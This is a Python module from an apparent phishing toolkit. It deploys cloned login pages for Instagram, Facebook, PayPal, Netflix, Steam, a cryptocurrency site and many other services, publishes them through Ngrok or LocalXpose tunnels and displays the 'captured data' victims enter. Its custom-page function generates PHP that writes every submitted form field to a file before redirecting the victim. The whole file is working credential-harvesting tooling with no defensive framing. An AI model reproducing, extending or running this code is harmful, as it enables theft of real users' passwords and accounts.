import os
import sys
import time
import subprocess
from termcolor import colored
from .mens import *
from .files import getUrl, getDone, getLocURL
####PAGES########################################################################
def get():
    try:
        i = int(input())
    except (NameError, SyntaxError, ValueError, TypeError):
        return 69
    return i

def done(v):
    os.system("clear")
    showTitle()
    print(v + colored("\nCaptured data:\t\t\tctrl + c to stop\n", "yellow"))
    getDone()
    print("\nSession closed.")
    try:
        input("Press enter to continue")
    except (NameError, SyntaxError):
        pass

def capture(method):
    lod(" Getting URL's", 5)
    lod(" Checking everything", 2)
    if method != 'ng':
        lod(" Pinging URL", 0.1)
        v = getLocURL(method)
        if v == "err":
            error(method)
        done(v)
    else:
        os.system("curl --silent http://localhost:4444/api/tunnels > shell/tunnel.json")
        try:
            v = getUrl()
            lod(" Pinging URL", 0.1)
            if v == 'err':
                error(method)
        except (Exception, PermissionError):
            error()
        done(v)

def error(errCode):
    if errCode == "ng":
        s = "\n\nSomething went wrong. Please check your internet connection or verify authtoken.\nYou can leave your authtoken empty but it can cause your server to crash unexpectedly"
        print(colored(s, "red"))
    elif errCode == "io":
        s = "\n\nIndex file was not found in path specified!"
        print(colored(s, "red"))
    else:
        s = "\n\nSomething went wrong. Please check your internet connection.\nIt is possible that the requested subdomain is taken or LocalXpose servers are temporarily down, try another subdomain name or Ngrok."
        print(colored(s, "red"))
    try:
        input("Press enter to continue")
    except (NameError, SyntaxError):
        pass
    if errCode == "io": return 69
    os.system("shell/close.sh > /dev/null &")
    os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)

def theMagic(p, custom, method):
    print("Getting ready...")
    os.system("cp -r %s www/" %p)
    if not custom:
        os.system("cp templates/temp/* www/")
    os.system("shell/config.sh %s" %method)
    print("")
    capture(method)

def instagram(method):
    os.system("clear")
    showInsta()
    r = get()
    if(r == 1):
        theMagic("templates/instagram/instagram_normal/*", True, method)
    elif(r == 2):
        theMagic("templates/instagram/instagram_survey/*", True, method)
    elif(r == 3):
        theMagic("templates/instagram/instagram_autoliker/*", True, method)
    elif(r == 4):
        theMagic("templates/instagram/instagram_badges/*", True, method)
    elif(r == 5):
        theMagic("templates/instagram/insta_followers/*", True, method)
    else:
        print ("Invalid option\nUsing default...\n")
        theMagic("templates/instagram/instagram_normal/*", True, method)

def adobe(method):
    theMagic("templates/adobe/*", False, method)

def bandoo(method):
    theMagic("templates/badoo/*", False, method)

def devian(method):
    theMagic("templates/devianart/*", False, method)

def ebay(method):
    theMagic("templates/ebay/*", True, method)

def facebook(method):
    os.system("clear")
    showFace()
    r = get()
    if(r == 1):
        theMagic("templates/facebook/fb_standard/*", True, method)
    elif(r == 2):
        theMagic("templates/facebook/fb_survey/*", True, method)
    elif(r == 3):
        theMagic("templates/facebook/fb_verify/*", False, method)
    else:
        print ("Invalid option\nUsing default...\n")
        theMagic("templates/facebook/fb_standard/*", True, method)

def github(method):
    theMagic("templates/github/*", False, method)

def lin(method):
    theMagic("templates/linkedin/*", False, method)

def space(method):
    theMagic("templates/myspace/*", True, method)

def netflix(method):
    theMagic("templates/netflix/*", True, method)

def origin(method):
    theMagic("templates/origin/*", True, method)

def paypal(method):
    theMagic("templates/paypal/*", True, method)

def pint(method):
    theMagic("templates/pinterest/*", False, method)

def twitt(method):
    theMagic("templates/twitter/*", True, method)

def pornhub(method):
    theMagic("templates/pornhub/*", True, method)

def reddit(method):
    theMagic("templates/reddit/*", True, method)

def shop(method):
    theMagic("templates/shopify/*", False, method)

def spot(method):
    theMagic("templates/spotify/*", True, method)

def steam(method):
    theMagic("templates/steam/*", False, method)

def sub(method):
    theMagic("templates/subitoit/*", False, method)

def crypto(method):
    theMagic("templates/cryptocurrency/*", False, method)

def twitch(method):
    theMagic("templates/twitch/*", False, method)

def play(method):
    theMagic("templates/playstation/*", False, method)

def wordp(method):
    theMagic("templates/wordpress/*", True, method)

def yahoo(method):
    theMagic("templates/yahoo_web/*", False, method)

def yandex(method):
    theMagic("templates/yandex/*", False, method)

def theCustomMagic(p, r, v, method):
    print("Getting ready...")
    os.system("cp -r %s/* www/" %p)
    os.system("cp templates/custom/* www/")
    fPHP = open("www/login.php", "a")
    for i in v:
        temp = "file_put_contents($file, \"[%s]: \" . $_POST[\'%s\'] . \"\\n\", FILE_APPEND);\n" %(i,i)
        fPHP.write(temp)
    fPHP.write("fwrite($fp, $info . \"\\n\");\n")
    fPHP.write("fclose($fp);\n")
    fPHP.write("header(\'Location: %s\');\n" %r)
    fPHP.write("?>")
    fPHP.close()
    os.system("shell/config.sh %s" %method)
    print("")
    capture(method)


def custom(method):
    print(colored("Custom websites must have the form action variable as: 'action=login.php'", "red"))
    path = input("Path to " + colored("folder", "red") + " containing index: ")
    if path[-1] == "/":
        path = path[:-1]
    redirect = input("Link to redirect to after login: ")
    print("How many input fields would you like to capture: ", end='')
    n = get()
    if n == 69:
        print("Invalid option")
        time.sleep(1.5)
        return n
    vars = []
    for i in range(0,n):
        print("Input field "+ colored(i+1, "red") + colored(" 'name'", "blue") + " variable: ", end='')
        temp = input()
        vars.insert(i, temp)
    print("\n"+colored("Folder: ", "blue"),path,"\n"+colored("Input Fields:", "blue"),vars,"\n")
    try:
        f = open("%s/index.html" %path)
    except IOError:
        err = error("io")
        return err
    f.close()
    theCustomMagic(path, redirect, vars, method)












        #
